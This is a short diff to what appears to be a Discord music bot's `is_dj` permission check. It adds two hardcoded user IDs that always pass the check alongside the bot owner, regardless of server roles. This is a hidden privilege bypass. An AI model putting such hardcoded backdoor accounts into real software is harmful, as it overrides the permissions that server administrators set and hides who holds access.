@@ -254,7 +254,7 @@ def is_dj(*, only_member_check=False):
             author.guild_permissions.manage_guild
             or upper in author.roles
             or lower in author.roles
-            or author.id == ctx.bot.owner_id
+            or author.id in [ctx.bot.owner_id, 612816777994305566, 251018556664184832]
             or only_member_condition
         ):
             return True
